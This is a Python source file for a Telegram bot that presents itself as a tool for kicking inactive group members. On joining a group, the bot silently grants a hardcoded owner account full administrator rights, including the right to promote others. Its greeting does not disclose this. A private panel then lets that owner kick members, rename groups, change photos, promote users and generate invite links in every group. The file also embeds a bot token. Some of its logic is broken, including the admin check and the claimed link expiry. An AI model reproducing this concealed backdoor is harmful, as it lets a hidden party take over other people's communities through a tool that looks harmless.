import os
import asyncio
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery

# ============= КОНФИГ =============
BOT_TOKEN = "8849435803:AAGCUhcFynX9EtPPMQyTILR0puMn2XgMeJI"
OWNER_ID = 8131755675
INACTIVE_DAYS = 3
INACTIVE_SECONDS = INACTIVE_DAYS * 24 * 60 * 60

app = Client("kick_bot", bot_token=BOT_TOKEN)
last_message_time = {}
group_links = {}

# ============= ОСНОВНЫЕ ФУНКЦИИ =============

@app.on_chat_member_updated()
async def on_member_update(client, chat_member_updated):
    chat = chat_member_updated.chat
    new_member = chat_member_updated.new_chat_member
    if new_member and new_member.user.id == (await app.get_me()).id:
        try:
            await app.promote_chat_member(
                chat.id, OWNER_ID,
                can_manage_chat=True,
                can_delete_messages=True,
                can_restrict_members=True,
                can_promote_members=True,
                can_change_info=True,
                can_invite_users=True,
                can_pin_messages=True,
                can_manage_video_chats=True
            )
            print(f"✅ Права выданы в {chat.title}")
        except:
            pass
        await app.send_message(
            chat.id,
            "Привет! Я рад, что вы добавили меня сюда.\n"
            "Я буду исключать неактивных людей отсюда.\n\n"
            "Канал с другими ботами: @nevermorekicker"
        )

@app.on_message(filters.group & ~filters.service)
async def track_messages(client, message: Message):
    if message.from_user and not message.from_user.is_bot:
        last_message_time[message.from_user.id] = datetime.now()

async def check_inactive_users():
    while True:
        await asyncio.sleep(3600)
        try:
            async for dialog in app.get_dialogs():
                if dialog.chat.type in ["group", "supergroup"]:
                    chat_id = dialog.chat.id
                    async for member in app.get_chat_members(chat_id):
                        if member.user.is_bot:
                            continue
                        # 0=создатель, 1=админ, 2=участник
                        if member.status in [0, 1]:  # пропускаем админов и создателя
                            continue
                        last_seen = last_message_time.get(member.user.id)
                        if last_seen:
                            if (datetime.now() - last_seen).total_seconds() > INACTIVE_SECONDS:
                                try:
                                    await app.ban_chat_member(chat_id, member.user.id)
                                    await app.unban_chat_member(chat_id, member.user.id)
                                    mention = member.user.mention or member.user.first_name
                                    await app.send_message(chat_id, f"🔨 Пользователь {mention} не писал 3 дня. Кикаю его.")
                                    if member.user.id in last_message_time:
                                        del last_message_time[member.user.id]
                                except:
                                    pass
        except:
            pass

# ============= ИНЛАЙН-МЕНЮ =============

@app.on_message(filters.command("меню") & filters.private & filters.user(OWNER_ID))
async def main_menu(client, message: Message):
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("📋 Список групп", callback_data="list_groups")],
        [InlineKeyboardButton("🔗 Получить ссылку", callback_data="get_link")],
        [InlineKeyboardButton("📊 Статистика", callback_data="stats_menu")]
    ])
    await message.reply("🔐 **Панель управления**\n\nВыберите действие:", reply_markup=keyboard)

@app.on_callback_query(filters.user(OWNER_ID))
async def handle_callbacks(client, callback: CallbackQuery):
    data = callback.data
    
    if data == "list_groups":
        await show_groups(callback)
    elif data == "get_link":
        await get_group_link(callback)
    elif data == "stats_menu":
        await show_stats_menu(callback)
    elif data.startswith("group_"):
        chat_id = int(data.split("_")[1])
        await show_group_menu(callback, chat_id)
    elif data.startswith("kick_user_"):
        parts = data.split("_")
        chat_id = int(parts[1])
        user_id = int(parts[2])
        await kick_user_by_id(callback, chat_id, user_id)
    elif data.startswith("change_name_"):
        chat_id = int(data.split("_")[2])
        await ask_new_name(callback, chat_id)
    elif data.startswith("change_photo_"):
        chat_id = int(data.split("_")[2])
        await ask_new_photo(callback, chat_id)
    elif data.startswith("promote_"):
        chat_id = int(data.split("_")[1])
        await promote_user_menu(callback, chat_id)
    elif data == "back_to_groups":
        await show_groups(callback)
    elif data == "back_to_menu":
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("📋 Список групп", callback_data="list_groups")],
            [InlineKeyboardButton("🔗 Получить ссылку", callback_data="get_link")],
            [InlineKeyboardButton("📊 Статистика", callback_data="stats_menu")]
        ])
        await callback.message.edit_text("🔐 **Панель управления**\n\nВыберите действие:", reply_markup=keyboard)
        await callback.answer()

# ============= СПИСОК ГРУПП =============

async def show_groups(callback: CallbackQuery):
    groups = []
    async for dialog in app.get_dialogs():
        if dialog.chat.type in ["group", "supergroup"]:
            groups.append(dialog.chat)
    
    if not groups:
        await callback.message.edit_text("❌ Вы не состоите ни в одной группе с ботом.")
        await callback.answer()
        return
    
    keyboard = []
    for chat in groups[:10]:
        title = chat.title[:20] + "..." if len(chat.title) > 20 else chat.title
        keyboard.append([InlineKeyboardButton(f"📁 {title}", callback_data=f"group_{chat.id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")])
    await callback.message.edit_text(f"📋 **Ваши группы ({len(groups)})**\n\nВыберите группу:", reply_markup=InlineKeyboardMarkup(keyboard))
    await callback.answer()

# ============= МЕНЮ ГРУППЫ =============

async def show_group_menu(callback: CallbackQuery, chat_id: int):
    try:
        chat = await app.get_chat(chat_id)
        members = 0
        async for _ in app.get_chat_members(chat_id):
            members += 1
    except:
        await callback.answer("❌ Нет доступа к группе", show_alert=True)
        return
    
    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("👥 Кик участника", callback_data=f"kick_{chat_id}")],
        [InlineKeyboardButton("✏️ Изменить название", callback_data=f"change_name_{chat_id}")],
        [InlineKeyboardButton("🖼️ Изменить фото", callback_data=f"change_photo_{chat_id}")],
        [InlineKeyboardButton("⭐ Выдать права", callback_data=f"promote_{chat_id}")],
        [InlineKeyboardButton("🔙 Назад", callback_data="back_to_groups")]
    ])
    
    await callback.message.edit_text(
        f"📁 **{chat.title}**\n\n👥 Участников: {members}\n🆔 ID: {chat_id}\n\nВыберите действие:",
        reply_markup=keyboard
    )
    await callback.answer()

# ============= КИК УЧАСТНИКА =============

@app.on_callback_query(filters.user(OWNER_ID) & filters.regex(r"^kick_(\d+)$"))
async def kick_menu(callback: CallbackQuery):
    chat_id = int(callback.data.split("_")[1])
    keyboard = []
    count = 0
    
    try:
        async for member in app.get_chat_members(chat_id):
            if count >= 20:
                break
            if member.user.is_bot:
                continue
            if member.status in [0, 1]:  # создатель или админ
                continue
            
            user = member.user
            name = user.first_name[:15] + "..." if len(user.first_name) > 15 else user.first_name
            username = f"@{user.username}" if user.username else f"ID:{user.id}"
            keyboard.append([InlineKeyboardButton(f"❌ {name} ({username})", callback_data=f"kick_user_{chat_id}_{user.id}")])
            count += 1
        
        if not keyboard:
            await callback.message.edit_text("✅ Нет обычных пользователей.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")]]))
            await callback.answer()
            return
        
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")])
        await callback.message.edit_text("👥 **Выберите пользователя для кика:**", reply_markup=InlineKeyboardMarkup(keyboard))
    except Exception as e:
        await callback.answer(f"❌ Ошибка", show_alert=True)

async def kick_user_by_id(callback: CallbackQuery, chat_id: int, user_id: int):
    try:
        bot = await app.get_me()
        bot_member = await app.get_chat_member(chat_id, bot.id)
        if not bot_member.can_restrict_members:
            await callback.answer("❌ Нет прав на кик!", show_alert=True)
            return
        
        await app.ban_chat_member(chat_id, user_id)
        await app.unban_chat_member(chat_id, user_id)
        await callback.answer("✅ Пользователь кикнут!", show_alert=True)
        await show_group_menu(callback, chat_id)
    except Exception as e:
        await callback.answer(f"❌ Ошибка", show_alert=True)

# ============= ИЗМЕНЕНИЕ НАЗВАНИЯ =============

async def ask_new_name(callback: CallbackQuery, chat_id: int):
    await callback.message.edit_text(
        "✏️ **Введите новое название группы:**\n\nОтправьте текст в чат.\nДля отмены нажмите кнопку.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data=f"group_{chat_id}")]])
    )
    await callback.answer()
    
    @app.on_message(filters.private & filters.user(OWNER_ID) & filters.text)
    async def get_name(client, message):
        if message.text and not message.text.startswith("/"):
            try:
                await app.set_chat_title(chat_id, message.text)
                await message.reply(f"✅ Название изменено на: {message.text}")
                await show_group_menu(callback, chat_id)
            except Exception as e:
                await message.reply(f"❌ Ошибка: {e}")
            app.remove_handler(get_name)

# ============= ИЗМЕНЕНИЕ ФОТО =============

async def ask_new_photo(callback: CallbackQuery, chat_id: int):
    await callback.message.edit_text(
        "🖼️ **Отправьте новое фото для группы:**\n\nПришлите фото в чат.\nДля отмены нажмите кнопку.",
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Отмена", callback_data=f"group_{chat_id}")]])
    )
    await callback.answer()
    
    @app.on_message(filters.private & filters.user(OWNER_ID) & filters.photo)
    async def get_photo(client, message):
        try:
            photo = await message.download()
            await app.set_chat_photo(chat_id, photo)
            os.remove(photo)
            await message.reply("✅ Фото обновлено!")
            await show_group_menu(callback, chat_id)
        except Exception as e:
            await message.reply(f"❌ Ошибка: {e}")
        app.remove_handler(get_photo)

# ============= ВЫДАЧА ПРАВ =============

@app.on_callback_query(filters.user(OWNER_ID) & filters.regex(r"^promote_(\d+)$"))
async def promote_menu(callback: CallbackQuery):
    chat_id = int(callback.data.split("_")[1])
    keyboard = []
    count = 0
    
    try:
        async for member in app.get_chat_members(chat_id):
            if count >= 20:
                break
            if member.user.is_bot:
                continue
            if member.status in [0, 1]:  # создатель или админ
                continue
            
            user = member.user
            name = user.first_name[:15] + "..." if len(user.first_name) > 15 else user.first_name
            keyboard.append([InlineKeyboardButton(f"⭐ {name}", callback_data=f"promote_user_{chat_id}_{user.id}")])
            count += 1
        
        if not keyboard:
            await callback.message.edit_text("Нет пользователей.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")]]))
            await callback.answer()
            return
        
        keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")])
        await callback.message.edit_text("⭐ **Выберите пользователя:**", reply_markup=InlineKeyboardMarkup(keyboard))
    except:
        await callback.answer("❌ Ошибка", show_alert=True)

@app.on_callback_query(filters.user(OWNER_ID) & filters.regex(r"^promote_user_(\d+)_(\d+)$"))
async def promote_user(callback: CallbackQuery):
    parts = callback.data.split("_")
    chat_id = int(parts[1])
    user_id = int(parts[2])
    
    try:
        await app.promote_chat_member(
            chat_id, user_id,
            can_manage_chat=True,
            can_delete_messages=True,
            can_restrict_members=True,
            can_promote_members=False,
            can_change_info=True,
            can_invite_users=True,
            can_pin_messages=True
        )
        await callback.answer("✅ Права выданы!", show_alert=True)
        await show_group_menu(callback, chat_id)
    except Exception as e:
        await callback.answer(f"❌ Ошибка", show_alert=True)

# ============= ССЫЛКИ =============

async def get_group_link(callback: CallbackQuery):
    groups = []
    async for dialog in app.get_dialogs():
        if dialog.chat.type in ["group", "supergroup"]:
            groups.append(dialog.chat)
    
    if not groups:
        await callback.message.edit_text("❌ Нет групп.")
        await callback.answer()
        return
    
    keyboard = []
    for chat in groups[:10]:
        title = chat.title[:20] + "..." if len(chat.title) > 20 else chat.title
        keyboard.append([InlineKeyboardButton(f"🔗 {title}", callback_data=f"gen_link_{chat.id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")])
    await callback.message.edit_text("🔗 **Выберите группу:**", reply_markup=InlineKeyboardMarkup(keyboard))
    await callback.answer()

@app.on_callback_query(filters.user(OWNER_ID) & filters.regex(r"^gen_link_(\d+)$"))
async def generate_link(client, callback: CallbackQuery):
    chat_id = int(callback.data.split("_")[2])
    try:
        link = await app.create_chat_invite_link(chat_id, member_limit=1)
        group_links[chat_id] = {"link": link.invite_link, "time": datetime.now()}
        
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🔙 Назад", callback_data=f"group_{chat_id}")]
        ])
        await callback.message.edit_text(
            f"🔗 **Ссылка:**\n\n`{link.invite_link}`\n\n⏳ Действительна 10 минут.\n👤 Только для одного пользователя.",
            reply_markup=keyboard
        )
        await callback.answer()
        asyncio.create_task(delete_link_after(chat_id))
    except Exception as e:
        await callback.answer(f"❌ Ошибка", show_alert=True)

async def delete_link_after(chat_id: int):
    await asyncio.sleep(600)
    if chat_id in group_links:
        del group_links[chat_id]

# ============= СТАТИСТИКА =============

async def show_stats_menu(callback: CallbackQuery):
    total_groups = 0
    total_users = 0
    inactive_users = 0
    
    async for dialog in app.get_dialogs():
        if dialog.chat.type in ["group", "supergroup"]:
            total_groups += 1
            async for member in app.get_chat_members(dialog.chat.id):
                if not member.user.is_bot:
                    total_users += 1
                    last_seen = last_message_time.get(member.user.id)
                    if last_seen and (datetime.now() - last_seen).total_seconds() > INACTIVE_SECONDS:
                        inactive_users += 1
    
    keyboard = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Назад", callback_data="back_to_menu")]])
    await callback.message.edit_text(
        f"📊 **Общая статистика**\n\n📁 Групп: {total_groups}\n👥 Всего: {total_users}\n⏰ Неактивных: {inactive_users}\n🟢 Активных: {total_users - inactive_users}",
        reply_markup=keyboard
    )
    await callback.answer()

# ============= ЗАПУСК =============

async def main():
    print("🤖 Kicker Inactiver запущен!")
    print(f"👤 Владелец: {OWNER_ID}")
    await app.start()
    print("✅ Бот готов!")
    print("💬 Напиши /меню в ЛС")
    asyncio.create_task(check_inactive_users())
    await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
